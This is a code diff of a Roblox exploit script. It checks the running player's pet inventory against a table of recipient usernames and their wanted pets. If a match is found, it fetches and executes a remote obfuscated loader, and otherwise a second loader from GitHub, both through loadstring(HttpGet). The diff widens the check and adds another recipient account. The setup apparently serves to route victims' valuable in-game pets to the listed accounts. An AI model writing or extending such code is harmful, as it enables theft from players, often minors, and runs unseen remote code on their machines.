@@ -19,7 +19,7 @@ game:GetService("Players").LocalPlayer.Idled:Connect(function()
     game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 end)
 
-local function hasTargetPet(petList)
+local function hasTargetPet()
     local success, result = pcall(function()
         local player = game.Players.LocalPlayer
         setthreadidentity(2)
@@ -27,9 +27,14 @@ local function hasTargetPet(petList)
         setthreadidentity(8)
         local allData = ActivePetsService:YieldUntilData().Table.PlayerPetData[player.Name]["PetInventory"]["Data"]
 
-        for uuid, pet in pairs(allData) do
-            if table.find(petList, pet.PetType) then
-                return true
+        -- Check all target configs
+        for username, config in pairs(_G.TradeManage.TargetConfigs) do
+            for _, petType in pairs(config.wantedPets) do
+                for uuid, pet in pairs(allData) do
+                    if pet.PetType == petType then
+                        return true
+                    end
+                end
             end
         end
         return false
@@ -57,7 +62,7 @@ _G.TradeManage = {
         ["NoahXShop"] = {
             wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly"}
         },
-	["Ayoshipship"] = {
+        ["Ayoshipship"] = {
             wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"}
         },
         ["zaq12wsx4z"] = {
@@ -69,15 +74,19 @@ _G.TradeManage = {
         ["Taylor117k"] = {
             wantedPets = {"Capybara"}
         },
-	["oreosandmilk2q"] = {
+        ["oreosandmilk2q"] = {
             wantedPets = {"Capybara"}
         },
         ["Minecraft_1u"] = {
             wantedPets = {"Capybara"} 
+	},
+	["nachan279"] = {
+            wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly", "French Fry Ferret", "Spaghetti Sloth", "Mochi Mouse", "Capybara"} 
         }
     }
 }
-if hasTargetPet(_G.TradeManage.Pet) then
+
+if hasTargetPet() then
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/LOAD1"))()
